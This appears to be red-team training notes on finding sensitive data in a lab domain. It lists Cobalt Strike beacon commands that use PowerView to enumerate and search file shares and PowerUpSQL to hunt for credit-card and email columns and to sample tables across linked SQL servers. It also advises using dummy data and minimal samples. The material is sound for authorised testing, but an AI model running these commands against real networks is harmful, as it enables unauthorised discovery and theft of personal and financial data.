# Data Hunting & Exfiltration

Orgs store data in file shares, databases, SharePoint, internal wiki's, etc. A red teamer's job is to find the "objective" of the op and _prove access_ to your client. Do not actually copy or move sensitive data out of its location, especially in regulated environments.

When planning the assessment, a good strategy to suggest is to create a dummy data repository that is subject to all the same security controls but doesn't actually contain any real data (fake or obfuscate it). That data can be generated by you or the client and is safe to remove from the environment. Otherwise, you can prove access to real data, but carry out an exfiltration exercise with dummy data.

Exfiltration exercises are an important step to gauge how effectively an organisation can detect and respond to their sensitive data being removed.

## File Shares

Find-DomainShare in PowerView searches for computer shares on the domain. The -CheckShareAccess parameter only shows that shares the current user has read access to.

    beacon> powershell Find-DomainShare -CheckShareAccess

Find-InterestingDomainShareFile searches each share for specified strings in the path:

    beacon> powershell Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*

Show the first ew lines of a file:

    beacon> powershell gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5


## Databases

PowerUpSQL provides various cmdlets for data searching and extraction.

1: Get-SQLColumnSampleDataThreaded searches one or more instances for databases that contain particular keywords in the column names (but only the instances you have direct access to):

    beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize

2: To traverse SQL links for the search use Get-SQLQuery:

    beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

3: Note the "employees" table. Next, list its columns:

    beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"

4: Take a data sample:

    beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"

If this is real data, don't extract multiple columns that can be correlated together. As in this example, take a sample of a column that doesn't really mean anything in isolation. To simulate data exfiltration of large dataset, have a look at [Egress Assess](https://github.com/FortyNorthSecurity/Egress-Assess).
